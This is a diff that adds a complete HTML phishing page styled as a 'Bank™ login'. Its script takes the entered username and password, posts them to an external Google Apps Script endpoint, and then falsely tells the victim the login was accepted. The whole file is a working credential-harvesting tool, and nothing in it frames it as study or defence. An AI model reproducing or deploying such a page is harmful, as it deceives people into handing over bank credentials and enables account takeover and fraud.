@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Bank™ login</title>
+  <meta charset="UTF-8" />
+</head>
+<body style="background:#111; color:#eee; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh;">
+  <form onsubmit="sendToSheet(event)" style="background:#222; padding:20px; border-radius:10px; box-shadow:0 0 10px #0af; width:300px;">
+    <h2 style="text-align:center;">Bank™ login</h2>
+    <input type="text" id="email" placeholder="Email/Username" required style="width:100%; padding:10px; margin:10px 0; background:#333; color:#fff; border:none;"><br>
+    <input type="password" id="password" placeholder="Password" required style="width:100%; padding:10px; margin:10px 0; background:#333; color:#fff; border:none;"><br>
+    <button type="submit" style="width:100%; padding:10px; background:#0af; border:none; color:#000;">Log In</button>
+  </form>
+
+  <script>
+    function sendToSheet(event) {
+      event.preventDefault();
+
+      const email = document.getElementById("email").value;
+      const password = document.getElementById("password").value;
+
+      const data = new FormData();
+      data.append("email", email);
+      data.append("password", password);
+
+      fetch("https://script.google.com/macros/s/AKfycby69FXNkbhLcd5sKXqb2MhQIDDH6GBLIhhCNbdYREEFDBRbHg7lQeMLDHNz1d20LR-b/exec", {
+        method: "POST",
+        body: data
+      })
+      .then(res => {
+        alert("✅ Login accepted");
+      })
+      .catch(err => {
+        alert("❌ Failed");
+        console.error(err);
+      });
+    }
+  </script>
+</body>
+</html>
